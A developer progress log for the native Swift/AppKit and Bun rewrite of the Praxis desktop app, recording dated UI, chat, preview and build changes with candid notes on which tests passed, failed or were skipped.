# PROGRESS LOG

Newest first. Append a dated entry when you finish a chunk of work.

## 2026-09-25 — Native composer border beam

Add a SwiftUI border beam inspired by libraries.dev/beam, using a colored angular
gradient, highlight and soft bloom over the existing Liquid Glass composer. The
Stop/Queue button loops throughout the active turn, preserving its phase when a
draft changes the icon. Each chat gets one three-second readiness sweep per app
launch; switching back does not replay it. Reduce Motion uses a still highlight,
and idle/hidden overlays remove their animation timelines. No Metal dependency.

Validation: native build, all typechecks, chat-controller and docs-link checks
passed. Native integration covered readiness expiry, chat switching, Stop/Queue
continuity and completion cleanup. Full integration hit the previously recorded
preview content-editable pointer timeout; the background rerun passed with real
pointer/animation timing skipped. Inspected generated beam captures and the
visible Liquid Glass composer in a disposable native fixture. No provider calls.

## 2026-09-25 — Relax native chat typography

Use a shared 13-point regular body font with 4 points of extra line spacing for
user and assistant prose. Increase paragraph separation to 12 points and segment
separation to 14; collapsed and expanded tool activity use consistent 11-point
monospaced text, keeping commands visually secondary to the conversation.

Validation: all typechecks, native build, chat-controller and docs-link checks
passed. Inspected narrow light/dark typography renders and the native chat capture.
Full native integration stopped at the preview content-editable pointer check;
the background rerun passed, with pointer/animation timing coverage skipped.
No real provider calls were made.

## 2026-09-25 — Explain cumulative chat token usage

Label the native footer as Chat total and reuse compact token formatting instead
of showing ungrouped seven-digit input counts. Hover exposes exact input, cached
input (a subset of input), and output, explicitly distinguishing accumulated model
call usage from current context size. Token accounting itself is unchanged.

Validation: native chat-controller and Codex usage tests, all typechecks and
native build passed; inspected the footer capture. Native background integration
failed twice at the existing soft-wrapped-composer-fit assertion, not usage.


## 2026-09-24 — Keep routine Codex skill-budget advice out of chat

Suppress the SDK's recurring “Skill descriptions were shortened” advisory in
new chat activity. This does not alter skill discovery or the provider's context
budget. Other item-level warnings now retain their full multiline text instead
of being cut off at 120 characters, and repeat events for an item appear once.
Previously saved activity remains unchanged.

Validation: Codex stream regressions, all typechecks and native background
integration passed. Background mode skips pointer/animation checks; no live
provider call was made.


## 2026-09-24 — Open the inspector only from the selection toolbar

Element picking updates inspection data without opening the right sidebar.
The selection toolbar's Properties action toggles it; an already-open inspector
continues following selection, while Close remains closed on subsequent picks.
Clearing selection or switching projects hides it. Animation-control discovery
and generated-control notifications no longer open the sidebar implicitly.

Validation: inspector unit tests, all typechecks and native background integration
passed, including hidden selection and explicit toolbar open/close. Background
mode skips real pointer gestures/animation timing.


## 2026-09-24 — Expand the native composer with its draft

Measure composer text using TextKit with the editor's font, wrapping width,
padding and trailing empty line. Include the full control/chip spacing in the
height calculation so short multiline drafts fit instead of scrolling early.
The composer grows upward to 360 points or half the available chat height,
whichever is smaller, then scrolls internally; clearing returns to compact size.

Validation: typechecks and isolated native background integration passed, including
anchored growth, trailing newlines, soft wraps, the height cap, overflow and shrink.
Inspected the content-only expanded composer capture; offscreen Liquid Glass is
not faithfully captured. Background mode skips real pointer/animation checks.

## 2026-09-24 — Codex live preview observation

Added preview_location and preview_screenshot to the session-scoped Codex MCP
bridge, including custom endpoint sessions. The stdio helper preserves MCP image
content rather than wrapping screenshots in JSON text. Claude and Codex now share
one native preview observation helper, with safe unavailable/empty capture results.
Codex receives observer instructions without advertising Claude-only calculators.

Validation: real Bun MCP subprocess/socket test passed for tool discovery, route
query/hash, JPEG content transport, capture failure/absence, and token isolation.
Rules, native boundary, Codex streaming, docs links and backend/preview/native
typechecks and the native build passed. No live provider calls were run; custom endpoints still need
image-capable models. Existing sessions must restart to load new tools/rules.


## 2026-09-24 — Retire Electron and audit unused application code

Made Swift/AppKit/SwiftUI + Bun the default and only application runtime. Removed
Electron entrypoints/preloads, the React app, browser/Tailscale mode, application
UI dependencies and obsolete tests. Services import native platform types and
routing directly; isolated WebKit instrumentation retains its restricted message
boundary. Removed dead web-panel/window.api bridges and renderer port/MCP flags.

Moved native cat artwork out of the renderer, retained source parsers/provider
SDKs, and preserved generator tests with React as a development fixture. The MCP
stdio test now runs under Bun. CLI, source installer, updates, scripts, typechecks,
test tiers and current guides now target native. Existing user profiles are untouched.

The review is in ELECTRON-REMOVAL.md, including retained dependencies, coverage
limits, the unused UI exports still shipped by the vendor package, and the separate
native prototype. Thirty-two direct dependency declarations were removed.

Validation: 96 retained unit tests passed, including the new native build-boundary
check and Bun MCP helper. Backend/native/preview typechecks, frozen-lockfile
installation and native background integration passed. Native captures were
inspected. Background mode skips real pointer gestures/animation timing; no live
provider calls or claims of full former Electron/Simulator parity were made.


## 2026-09-24 — In-app preview server recovery

Added Running Servers to the native preview error screen and Actions menu. The
local inspector lists this user's TCP listeners whose working directory matches
the selected project, including address, PID, command and start time. Stop & Retry
shows a confirmation, revalidates the process identity and project ownership,
sends SIGTERM, waits for the listener to stop and retries through Praxis's normal
workspace lifecycle. Other projects and changed/reused PIDs are refused. Errors
stay in the sheet with Refresh/Retry available; no provider login is required.
Long preview errors now scroll so the recovery controls remain reachable.

Validation: current TypeScript targets and native recovery tests passed. Native
background integration and screenshot inspection passed from an isolated source
snapshot because a concurrent task was removing Electron/build inputs. Tests cover
real listener discovery, unrelated-process isolation, changed process identities,
confirmation/cancellation, stale project actions and restart routing.

## 2026-09-24 — Correct undersized chat toolbar icons

The previous change misread the size discrepancy and made History/New Chat
smaller. Increase both custom-control images from 16 to 22 points, above their
original 20-point size; retain the sidebar toggle as the reference and leave
button hit areas unchanged.

Validation: native typecheck, build and background integration passed; inspected
the enlarged chat glyphs in a fresh capture. General typecheck failed on preview
listener signatures being changed by the concurrent migration.

## 2026-09-24 — Match chat toolbar glyph sizes to the sidebar toggle

History and New Chat now use 16-point template images in their custom controls,
matching the smaller system sidebar toggle visually. Other toolbar symbols keep
their existing size, and button hit areas are unchanged. The symbol cache includes
image size so callers cannot accidentally share differently sized artwork.

Validation: all TypeScript targets and native background integration passed.
Inspected the rebuilt chat toolbar capture; offscreen glass prevents a reliable
full-toolbar capture, and the live inspector resolved to the existing app.

## 2026-09-24 — Align sidebar actions and preserve symbol proportions

Moved action labels and icon slots four points left to align
with the project rows. SF Symbols now fit proportionally inside their 16-point
slots instead of stretching into squares, preserving folder-plus and plus-square
artwork proportions.

Validation: all TypeScript targets, native background integration and direct
sidebar action dispatch passed. Inspected the final sidebar capture; pointer
gestures/animation timing were skipped by the background integration mode.

## 2026-09-24 — Restore native sidebar project switching

Native outline selection sends a `project:` row ID without a separate project
field. Workspace routing previously fell back to the active project, so clicking
another open project simply reselected the current one. Resolve project actions
from their row ID before falling back to the explicit or active project.

Added a native integration regression that opens two static projects and selects
first/second/first through the AppKit outline callback, checking the active
workspace, chat and preview at every step. Confirmed it fails before the fix.

Validation: all TypeScript targets, workspace-controller unit checks, docs links
and native background integration passed. Foreground runs passed switching but
timed out at the later style edit after pointer-selection checks; background mode
skips those real pointer gestures. Inspected the project-switching capture.

## 2026-09-24 — Native chat clipboard attachments

The plain AppKit composer now advertises file URL, PNG and TIFF pasteboard types
and routes AppKit selection reads into the existing attachment handler. Previously,
AppKit disabled Paste for image-only clipboards before the custom paste handler
could run. Copied files and images now use the same attachment path as the picker.

Added native regression checks for Paste menu validation/responder dispatch,
PNG/TIFF attachments, multiple file URLs, removal, Unicode text fallback and an
empty clipboard. The check preserves and restores clipboard contents and is only
available to the ephemeral integration profile. The image Paste assertion was
confirmed failing before the fix.

Validation: all TypeScript targets, native chat-controller tests, docs links and
native background integration passed. Integration ran from an isolated snapshot
because another task was editing/building the same native files; that task's
unfinished project-switching check was excluded. Screenshot captures were read,
but offscreen Liquid Glass does not paint the composer reliably; attachment state
and Paste dispatch were asserted directly. No paid provider turns were run.

## 2026-09-24 — Project actions in the native sidebar

Replaced the toolbar project menu with full-width Open Project and New Project
sidebar buttons. Regular system-label text and distinct folder-plus/plus-square
icons match the project rows, with a 16-point gap before the project list.
Both buttons use the existing project action handlers.

Validation: TypeScript/native typechecks, isolated native build, direct button
action dispatch and sidebar image inspection passed. The full native integration
run stopped in a concurrently added project-switching check, outside this change.


## 2026-09-24 — Let the native window surface show through

Removed the explicit windowBackgroundColor fill from the welcome and preview
loading/setup/error views. These SwiftUI surfaces now stay transparent, like the
chat, so the main area inherits the native window surface instead of painting a
separate dark rectangle. Buttons and the cat retain their native presentation.

Validation: rebuilt Swift and ran the native-only integration checks.

## 2026-09-24 — Complete native UI migration; remove the React runtime

The native build now compiles Bun services, Swift/AppKit/SwiftUI surfaces and the
isolated project-preview script only. Removed the native Vite/React/Tailwind
build, main/panel/editor WebViews, app asset server and obsolete renderer bridge.
A build-input audit rejects application renderer dependencies and deletes stale
hybrid assets. Electron keeps its independent build and shared service APIs.

Finished native source file tree/history, panel resizing/persistence, chat tables
and code coloring, sticky request context, attachment errors, chat rename/close
and project ordering. Added content draft undo, linked spacing controls, HMR style
reconciliation, native update/restart with dirty-work guards, downloads/media
permission prompts and bounded WebKit crash recovery. The cat/loading surfaces
remain Swift-owned. Bun stays as the shared backend; WebKit is only the project
preview and its Inspector.

Native geometry checks exposed an AppKit bug: assigning the source editor itself
as a pop-out window content view let its window-sizing behavior follow it back
into the workspace and collapse the main window. A dedicated pop-out container
keeps that ownership separate. Regression checks preserve the 828-point window
and 776-point canvas after docking; full-size chat captures show Markdown,
tables, code and question cards correctly. Offscreen AppKit image caching does
not capture Liquid Glass materials faithfully; those require visible checks.

Validation: all four TypeScript targets, native controller tests, docs links and
native integration passed. Integration asserts exactly one project-preview
WebView throughout; verifies native sheets, source/content/style writes, conflict
and revision handling, queue/stream/question/permission behavior, marked-text
input, cat frames and repeated resize/dock paths. Terminal shutdown checks pass
SIGINT/SIGTERM/SIGHUP. Foreground checks covered Unicode paste, source tree/find,
repeated chat divider drags, selection inspector, source pop-out/dock and download cancellation.
A missing-style snapshot exposed by the foreground fixture now defaults to empty
computed values instead of opening Activity with an exception; regression covered.
A transient computed-style read on one integration rerun also exposed a test
readiness assumption; that check now waits for the asynchronous selection result.
No Electron tests, real update pulls, publishing, credential writes or paid
provider turns were run. Broader IME, accessibility, large-project and older
macOS/iOS Simulator release testing remain separate verification work.

Three fresh-profile native benchmark launches passed: median 0.606 s to native
ready, 0.676 s to preview, 787 MiB total process RSS (411 MiB without the provider
helper), 1.43% of one core idle, six processes. Application files are 3.98 MiB,
64.13 MiB including Bun, excluding dependencies and system WebKit. This is a new
snapshot, not a paired Electron comparison; see RUNTIME_BENCHMARK.md for limits.

## 2026-09-24 — Native visual inspector and content forms

Selection now opens SwiftUI property/style/custom controls without a property
WebView. Shared CSS metadata and control prompts are extracted from React. Native
controls include sliders, color/token pickers, Bézier handles, literal/prop/style
writes, reset and animation replay. Bun routes inline text, comments and annotation
creation directly. Recipe-driven native content windows preserve drafts, extra
JSON fields, collection IDs/order, and revision-checked saves. The pure recipe
validator is bundled because its package export cannot be required from CJS.

Validation: inspector targeting/token/schema/stale-action tests, recipe validation
and save-conflict tests, shared CSS tests, all typechecks and native background
integration passed. The integration verifies no property WebView is created.
Foreground controls/scrubbing and full content-form visual checks remain pending.
The main React view/build are the next removal step.

## 2026-09-24 — AppKit source editing and layers

Native source editing now uses NSTextView with line numbers, native find/replace,
syntax coloring, file filtering/create/rename/trash, component navigation, native
media display and reusable dock/pop-out windows. Bun retains per-file drafts and
baseline-checked saves; clean documents refresh when reopened. Source WebViews
are no longer created. Layers now uses NSOutlineView, including hover/selection,
source-backed drag reordering and background-agent fallback. React duplicate
reorder handlers are disabled in native mode.

Validation: editor race/conflict/draft and layers scope/cancellation tests passed,
as did typechecks and native background integration. The integration saved a real
file through the native editor and exercised dock/pop-out reuse. Foreground drag,
find/replace, IME, large-file responsiveness and visual verification remain; the
property/custom/content panels and main renderer are still pending migration.

## 2026-09-24 — Native shell state and preview recovery

Bun now constructs project/history rows, favicons, chat titles, toolbar state and
preview location directly. Selection/device/expand/address actions no longer run
through App.tsx; a temporary projection keeps the remaining web tools aligned.
Swift owns preview loading, setup, failure and retry surfaces. Annotation pins
and selection clearing now use the event-only preview bridge directly.

Validation: shell navigation/origin/persistence tests and context tests passed,
as did typechecks and native background integration. Native resize also runs
with renderer event delivery disabled. Main WebView creation and React editing
panels remain until their replacements are complete.

## 2026-09-24 — AppKit-owned workspace geometry

AppKit now places the chat/composer, preview, mobile device artwork, divider and
legacy property-panel view. Column clipping retains the conversation's text width
during expand/restore. Native chat and preview no longer receive DOM rectangles;
remaining web tools report only desired panel insets. Native widths persist in the
profile. Shell state and editing panels are still transitional renderer clients.

Validation: all typechecks and native background integration passed, including
repeat divider drags, expansion, toolbar alignment, mobile and panel operations.
Background captures were inspected, but system glass content capture is incomplete;
foreground pointer/animation/visual checks remain required before final parity.

## 2026-09-24 — Native Git workflows and environment refresh

Bun now owns native branch switching/creation, publish mode and publishing,
including conflict/recovery output. Git updates and GitHub connection use native
sheets. Feedback now previews optional screenshot/conversation attachments in a
native sheet; diagnosis offers a repo-only draft for review before sending. Git mutations share the project's operation queue; results stay scoped
to their original root when the active project changes. Native landed environment
changes restart the managed preview through Bun, including dependency installs.
Closing Activity restores the main window's focus (a background-color integration
check exposed the missing restoration).

Validation: Git workflow/scope/conflict tests and workspace tests passed, as did
all typechecks and native background integration after the focus fix. Feedback
attachment opt-outs and diagnosis draft scoping also passed pure tests; native
feedback/diagnosis presentation was exercised without submitting. Live GitHub
creation/publishing was not executed; those operations use service stubs in tests.

## 2026-09-24 — Bun-owned native chat context

Native selected-object prompt context, setup/token offers, annotations, background
spawn state and history refresh now come from Bun service events. React no longer
publishes whole chat contexts or chooses the native active chat. Remaining visual
panels temporarily forward selection changes only. Setup completion restarts the
active native project and verifies source stamps. Shared selection formatting is
extracted for both runtimes.

Validation: context race/scope tests, native chat tests, all typechecks and native
background integration passed. The desktop check disables renderer delivery,
injects preview selection, sends via Swift and verifies selection is cleared.
Branch/publish and window geometry still need migration; no Electron tests ran.

## 2026-09-24 — Native activity and session review

Moved activity presentation to a selectable AppKit window with Copy All/Clear,
direct Bun server-event ingestion, capped buffering and throttled repaint. Saved
session review now uses a native sheet with transcript/files, resume, apply,
PR actions and confirmed discard. Electron retains its existing surfaces.

Validation: all typechecks, bounded-buffer/review lifecycle tests and native
background integration passed. Native activity show/clear/hide was exercised.
Review operations used service stubs; no live PR or provider call was made.
Background mode still skips actual preview mouse/animation verification.

## 2026-09-24 — Native project and provider sheets

New Project, project memory, Settings and provider connection management now use
SwiftUI sheets backed by Bun controllers. Provider catalog selection, manual IDs,
saved-key preservation and delete confirmation reuse the existing services.
Canceled asynchronous requests cannot reopen a dismissed sheet. Native New Chat
also passed with renderer event delivery disabled; React remains a projection
for the panels and layout that have not migrated yet.

Validation: sheet/settings controller tests, all typechecks and native background
integration passed. Inspected native sheet captures. Real preview input and
animation sampling were skipped by background mode; no Electron tests ran.

## 2026-09-24 — Plan Jev-composed native chat islands

Added CHAT-ISLANDS.md and staged roadmap items for on-demand interactive UI inside
assistant messages. The plan separates agent-discovered bindings, Jev block/group
composition, Bun state/source transactions and native SwiftUI rendering. Includes
follow-up revisions, durable history, landing/stale-source behavior, engine failure
handling and tween/spring/combined-animation plus typography acceptance scenarios.
Initial controls commit on release through HMR; runtime-live preview adapters are
a later extension. Planning only; no island implementation or live model call.
Validation: all TypeScript projects including native, existing documentation-link
check and diff whitespace check passed. No runtime suites ran for this docs change.

## 2026-09-24 — Bun workspace navigation and native preference storage

Added a Bun workspace controller for open/select/close, restore, history loading,
new/switch/close/resume chat and warm-project eviction. Native sidebar/menu
navigation calls it directly. React receives a temporary projection for the
remaining panels; branch/publish, editing context and some metadata effects still
need migration. Per-project operations serialize; stale opens cannot reclaim the
active screen and a close waits for startup before stopping its resources.

Native UI preferences now use a versioned profile file with legacy per-key import,
deletion tombstones and trusted-view bootstrap. Shared model-preference and
workspace types are independent of the renderer. Electron retains browser storage.

Validation: workspace lifecycle/race tests, preference restore/import tests,
preferred-model and rail-order tests, all typechecks, and native background
integration passed. Native-only work; no Electron tests or live provider calls.
The next integration run also disables renderer delivery during New Chat.

## 2026-09-24 — Plan remaining native migration

Audited current host/build, workspace actions, chat context adapter, DOM geometry
and remaining web panels. Added NATIVE-MIGRATION.md with seven ordered stages and
exit checks: Bun workspace ownership, AppKit layout, main-WebView removal, native
sheets, editing tools, source/chat parity, and build cleanup. Preserve Electron
and Bun services; retain WebKit for project content and inspection. This entry
records planning only; no runtime migration or benchmark was performed.

## 2026-09-24 — Native welcome, animated cat and reliable chat resizing

Moved startup/loading and empty workspace presentation into SwiftUI, with native
Open/New/recent-project controls. Bundled the original pixel artwork and animation
timings as rectangles for native drawing. The cat returns to the conversation
footer with running, waiting, idle and completion poses; hidden views pause timers
and Reduce Motion disables animation.

The black toolbar crescent was a clipped “C” from the empty Chat title. The chat
toolbar item now exists only with a visible chat, and narrow titles hide rather
than showing a sliver. AppKit owns divider input above the native chat/preview
surfaces, so resizing cannot cover the next drag target. Manual resize updates
disable the expand/collapse CSS transition. Workspace geometry, navigation and
remaining panels still depend on the web shell; this is not yet React-free.

Validation: TypeScript checks, pure cat artwork/controller tests, native build and
background integration passed. Added three consecutive divider drags and native
hit-target checks, empty-toolbar/welcome checks, and running/waiting cat checks.
Inspected welcome and Swift chat captures. Background mode skips actual preview
mouse input and preview-animation sampling; no Electron or live provider tests ran.

## 2026-09-24 — Move native chat behavior into Bun

Native no longer mounts React ChatPanel. A Bun controller owns per-chat drafts,
attachments, skill completion, streamed messages, queues, model changes and native
card actions. Swift talks directly to it. Pure provider/settings/setup mappings
are shared with Electron; workspace context, layout and other panels remain web
based, so the application is not yet fully React-free. Conversation mirrors are
sent to the shell only when changed and replayed on renderer reattach.

Stop, permission and conflict operations now accept an explicit session target;
existing active-chat callers retain their behavior, and browser RPC validates the
new targets against its repository scope. Closing a chat cancels queued/preparing
submissions. Fixed AppKit draft revisions when returning to a previously edited chat.

Validation: controller and relevant pure-unit tests, all TypeScript checks, native
build and background integration. Integration disables renderer event delivery
while exercising Swift Send, queues, streaming and permission/question replies.
Inspected the native conversation capture. Background mode explicitly skips real
preview mouse input and animation sampling. No Electron or live provider tests ran.

## 2026-09-24 — Render native chat in Swift

Added SwiftUI conversation rendering with selectable inline Markdown, fenced code,
headings, tool disclosures, sent attachments, copy/revert actions and native
permission/question/setup/conflict/queue cards. AppKit composer controls now use
typed state/actions instead of a hidden web form; deleted the DOM composer adapter.
NativeChatSurface reserves geometry only. Drafts, models, permissions, skills,
queues and provider submission reuse the shared controller. That controller and
other application panels still use React; removing its runtime is not completed.

Native build and all typechecks passed. Explicit background integration passed
composer/history drafts, attachments, skills, typed Send/queue removal with a stubbed
provider, streamed text/tool activity, permission/question responses and absence
of React chat DOM. Inspected the Swift conversation capture. Normal-mode checks
could not verify preview mouse input/animation with WebKit reporting the test
window hidden; background mode explicitly skips these checks. No live provider
calls or Electron tests ran. Native table layout, code highlighting and animated
cat/sticky user-bubble parity remain follow-up work.

## 2026-09-24 — Preserve native sidebar projects across launches

Native now saves workspace JSON atomically in its own profile, independent of
WebKit localhost storage. Restore retains every saved project, including those
without a live process, and reopens the last selected project through the existing
suspended-project path. Explicit closes remain persisted. Existing localStorage
is the migration fallback; Electron's restore policy remains unchanged.

Native workspace tests cover disk reopen, empty-list persistence, invalid writes,
and cold-launch retention/selection. Both tests, all TypeScript checks and the
full native integration suite passed. No Electron tests ran.

## 2026-09-24 — Isolate selection input from the native preview app

Selection now stops page keyboard, pointer and editing event handlers at window
capture. Inline text editing retains WebKit's caret, typing and clipboard defaults;
Praxis handles Enter/Escape before suppressing propagation. Inspection scrolling
and overlay controls remain available. Native preload installation now runs at
document start so project capture listeners cannot run first.

Added native regression coverage with parser-registered page capture listeners,
real mouse/keyboard input, caret movement, typing, cancel/commit and restored
interaction after leaving selection mode. Native integration and all TypeScript
checks passed; inspected the native shell capture. No Electron tests ran.

## 2026-09-24 — Reduce native idle work and unused WebKit memory

Created the property-panel view on demand, preserving retained state on first
open and reusing the view on reopen. Replaced the composer's 150 ms DOM polling
with React commit, input, mutation and resize notifications. Unchanged native
sidebar rows retain decoded favicons; toolbar symbols reuse rendered artwork.

Three paired runs against f4e3ed1 reduced median summed RSS from 976 to 898 MiB
and processes from eight to seven before the panel is opened. Idle CPU medians
were 2.16% and 1.82% of one core, with overlapping short samples. Startup and
preview timing stayed approximately 0.86 s and 1.03 s; no speedup is claimed.
The earlier 2.54 s native startup result did not reproduce in this controlled
rerun. Restricted blank-page launches were excluded, not called fixed.

Full native integration passed, including new first-use panel/reopen coverage,
composer skills/drafts/permissions, source editing and Web Inspector. Typechecks
passed. No Electron tests or live provider prompts ran. Kept Electron pending
remaining platform and functionality validation; documented measurement limits.

## 2026-09-24 — Clear native toolbar button highlights

Replaced automatically generated toolbar group controls with explicit momentary
NSSegmentedControls. Setting selectionMode on manually assembled subitems had
not configured the rendered control, so its last-clicked segment stayed selected.
Actions now clear transient selection immediately and refresh enabled states,
images and tooltips from their existing toolbar items. Native automation invokes
the group callback and checks the actual segmented cell's tracking/selection.

Build and TypeScript checks passed. Native integration passed selection, device,
code and expand/restore toolbar checks, including the residual-selection assertion;
inspected the shell capture. The full run later timed out initializing the property
panel with concurrent lazy-panel changes present. No Electron tests ran.

## 2026-09-24 — Animate native preview expansion

Native chat width now transitions over 240ms, with matching sidebar easing and
toolbar alignment following the measured width. The conversation retains its
layout width while clipped, avoiding temporary text reflow and scrollbar overflow.
Divider dragging remains immediate; Reduce Motion disables the transition.

All TypeScript checks and native build passed. Native integration verified
intermediate expansion widths, stable conversation width, sidebar restoration,
toolbar alignment and composer typing/drafts. Inspected the shell capture. The
full run subsequently failed waiting for the composer slash-command skill list
with concurrent composer transport edits present. No Electron tests ran.

## 2026-09-23 — Native preview Web Inspector

Added a Develop menu with preview Web Inspector (Option-Command-I) and JavaScript
Console (Option-Command-C). Preview-only developer extras enable WebKit's native
Inspect Element context-menu action. Guarded private inspector selectors stay
in Inspector.swift, with a Safari Develop-menu explanation if unavailable; the
preview's application IPC permissions are unchanged.

Native integration opened the real preview inspector, invoked its console, and
closed it successfully. Full native integration, build and type checks passed.
No Electron tests ran.

## 2026-09-23 — Momentary toolbar actions and native app icon

Native toolbar groups now use momentary selection and clear residual selection
when applying state, preventing Expand from staying highlighted after use.
The native bundle includes the existing build/icon.icns as Resources/Praxis.icns,
references it through CFBundleIconFile, and sets the application Dock icon on
launch. Toolbar glyphs retain aspect ratios; the current fitting normalizes their
maximum dimension rather than applying one identical scale to every SF Symbol.

Native integration (including unselected groups after expand/restore), native
build and all TypeScript checks passed. Verified the bundled icon matches the
source resource and its plist entry. No Electron tests ran.

## 2026-09-23 — Native/Electron runtime comparison

Measured current builds on the local M4 Pro with isolated profiles and the same
200-card static preview. Native runtime/application files (excluding external
packages) measured 63.7 MiB vs Electron 309.0 MiB. Successful-run median summed
RSS was 732 vs 1,022 MiB including the automatically started Claude helper;
launch-to-ready was 2.54 vs 0.66 seconds. Two of four native attempts failed
readiness; all three Electron attempts completed. See RUNTIME_BENCHMARK.md for
methodology, ranges and limitations. Local raw data lives in
`test/artifacts/runtime-benchmark/`. All recorded benchmark processes exited.
No product code changes; no broad Electron test suite was run.

## 2026-09-23 — Moderate toolbar icon reduction

Increased fixed toolbar glyph bounds from 28 to 36 pixels within the same 40px
2x template. This targets roughly 20% smaller than the original icons instead
of the previous ~38% reduction, preserving button sizes and toolbar layout.
Native build passed.

## 2026-09-23 — Enforce rendered toolbar icon size

The earlier SF Symbol configuration did not reduce the displayed toolbar glyphs:
AppKit applied its own symbol sizing. Toolbar symbols are now rasterized into
2x template artwork with explicit glyph bounds, preserving native tint and
controls without symbol reconfiguration. Inspected actual before/after shell
captures and measured dark glyph pixels: Layers height fell from 39px to 24px;
device from 37px to 23px. All native integration checks and type checks passed.
No Electron tests ran.

## 2026-09-23 — Compact toolbar with visible preview actions

Preview action groups now have high visibility priority. Chat/header widths
adapt to the available window width, reserving room for all preview actions;
the title/address truncate before actions overflow. Toolbar symbols use a 14pt
configuration in a 16pt image. A native sidebar observer removes Projects from
the toolbar when collapsed and restores it when reopened, so it cannot remain
in the overflow menu.

Native integration passed, including action visibility at 850, 1100 and 1320pt,
Projects absent while collapsed, expand/restore and existing application flows.
An independent AppKit harness confirmed both groups and Publish visible at all
three widths. Type checks passed; inspected the native shell capture. No Electron
tests ran.

## 2026-09-23 — Preview header contrast and duplicate divider

The domain/branch inherited the app's light appearance even when the preview
painted a dark toolbar. The page-color observer now selects light/dark header
appearance and explicit contrasting text, including the address editor and
branch menu title. Native integration checks cover dark-to-light page changes.
White-on-#111 and black-on-#fafafa domain text pass APCA at 13px bold.

Pixel inspection found a two-pixel web resize handle beside the one-pixel native
divider below the toolbar. Native CSS now clears its paint while preserving the
drag target. The native divider has its own layer, pixel-aligned preview edge,
and lighter opacity. Native integration and type checks passed; no Electron
suite was run.

## 2026-09-23 — Full-height native preview surface

Removed native preview card fills/outlines and extended the detail behind the
transparent titlebar. A hit-test-transparent AppKit surface observes WebKit's
page-derived underPageBackgroundColor (html/body blend), paints the desktop
preview's toolbar backing, and draws one lighter full-height left divider.
The web view still begins below the toolbar safe area; mobile keeps its surround.
Removed the separate chat-header separator.

Expand/restore previously combined an immediate web layout with a 50ms-delayed
native sidebar collapse. Workspace snapshots now sync immediately, other layout
snapshots coalesce without that delay, and desktop WebKit follows canvas resizing.
Geometry effect cleanup also sent zero-sized frames when insets/viewport changed;
only unmount now clears the native view. Empty views do not autoresize back open.

Native build, all TypeScript checks, and full native integration passed, including
live html/body background changes, safe-area/divider geometry, expand/restore,
editing, undo/redo and bridge isolation. Inspected shell capture: flush preview,
continuous divider, content below toolbar. Offscreen glass capture limitations
remain; animation smoothness was not measured. No Electron tests ran.

## 2026-09-23 — Sidebar row fit and project favicons

The source-list document could remain wider than its scroll viewport, clipping
selection highlights and the trailing More control. A native scroll-view subclass
now fits document/column width when the viewport changes. Project text can
compress instead of displacing its controls. Native rows receive project icons
from the same cached resolver as the React rail, decode data-URI images including
SVG, and retain a folder fallback for absent/unreadable icons.

Added native integration checks for an SVG fixture and row/action bounds at
sidebar divider widths 180, 300 and 230. Full-app attempts failed before UI load
with the existing WebKit startup unsupported-result error. Independently compiled
and ran the actual AppKit shell: SVG decoding succeeded; document widths matched
viewports (180, 292, 222), and More ended 20 points inside each viewport. Inspected
a capture, with the existing offscreen compositing limits. Native build, all four
typechecks, project-icon unit tests, docs-links and whitespace checks passed.
No Electron tests ran.

## 2026-09-23 — Select Object beside device switching

Moved Select Object from the composer attachment menu into a native toolbar
group with the phone/desktop toggle. The action routes through the existing
shared toggleSelect handler, and its tooltip/icon reflect selection mode while
remaining in the group. Code/Layers/Expand retain their separate group.

Native integration passed group membership and selection on/off checks plus
existing flows. Final native build, all four typechecks, docs-links and whitespace
checks passed. No Electron tests ran.

## 2026-09-23 — Plain compact composer controls

Made attachment/tools a borderless plus (the image belongs to the popup’s first
menu item, avoiding its previous chevron-only appearance). A flexible gap keeps
it on the left and the provider/model/permission menus on the right. Those menus
are borderless without native arrow chrome, sized from full selected labels up
to 60 points, with truncation only when constrained. Full names stay in menus
and tooltips. The empty, context-free form minimum is reduced from 146 to 120
points including controls; populated forms retain the previous space.

Native build/integration passed, including plain-picker/width/plus assertions and
existing geometry, drafts, attachment, permission and slash flows. All four
typechecks, docs-links and whitespace checks passed. Inspected the capture with
the documented glass compositing limitation. No Electron tests ran.

## 2026-09-23 — Selectors below the native composer

Moved the attachment/tools menu and provider/model/permission selectors to a row
below the Liquid Glass form, directly on the window surface. The form keeps its
112-point minimum; the shared hidden layout reserves another 34 points for the
row and gap. Send/Stop remains inside the lower-right corner as a 30-point native
button, with a 13-point medium-weight symbol and no image upscaling.

Native integration passed geometry assertions that selectors are below the form
and Send remains inside at its standard size, plus drafts, permissions, slash
completion, attachment and editing flows. Native build, all four typechecks,
docs-links and whitespace checks passed. Inspected the composer capture with the
existing glass compositing limitation. No Electron tests ran.

## 2026-09-23 — Domain and branch header

Replaced the separate branch pill and address field with a plain two-line native
header: bold preview host/port above a smaller muted branch menu. Removed Home.
The address reveals the full URL on editing, preserves existing origin-scoped
navigation, and returns to its compact domain display afterward. The branch menu
retains branch switching, Git Updates and New Branch. Entering `/` returns to the
preview origin root.

Native build/integration passed twice, including domain display, toolbar order,
query/hash and root navigation plus existing native flows. All four typechecks,
docs-links and whitespace checks passed. Inspected the toolbar capture with the
existing offscreen compositing limits. No Electron tests ran.

## 2026-09-23 — Terminal cleanup and transparent native chat

Identified and stopped the orphaned lkmv.ch dev-server process group listening on
7784. Native cleanup handled SIGINT/SIGTERM but omitted terminal hangup (SIGHUP).
The launcher now forwards SIGHUP and the backend’s shared shutdown hook invokes
existing server/agent cleanup for all three signals and normal exit. Added a
pure-Bun regression test against the actual shared dev-server service: each
signal terminates a spawned detached server. Both regression runs passed.

The black chat remained because transparent pane CSS still exposed the opaque
page body and WKWebView backing. Cleared the main webview’s background drawing
and under-page color, plus page/root/chat/status-fade fills, to expose the actual
AppKit window surface. Preview and component card backgrounds remain scoped.

Native build/integration passed, including explicit transparent body/chat checks
on the final run; one intermediate retry hit the existing WebKit startup error.
Inspected the shell capture: chat matches the titlebar surface (other glass
capture limitations remain). All four typechecks, docs-links and whitespace
checks passed. No Electron tests ran.

## 2026-09-23 — Separate native preview toolbar groups

Separated the desktop/mobile toggle from a native NSToolbarItemGroup containing
Code, Layers and Expand, with fixed toolbar spaces between groups. Layers uses
the shared panel store. Replaced the custom accent-colored Publish stack with a
standard NSMenuToolbarItem, retaining its action and PR/merge menu as a separate
trailing control.

Native integration passed group membership, Layers open/close, navigation,
code/expand, publish mode and existing composer/editing flows. Native build and
all four typechecks passed, as did docs-links and whitespace checks. The first
build collided with another build updating generated Swift input; the retry
passed. Inspected the toolbar capture with its existing offscreen compositing
limitations. No Electron tests ran.

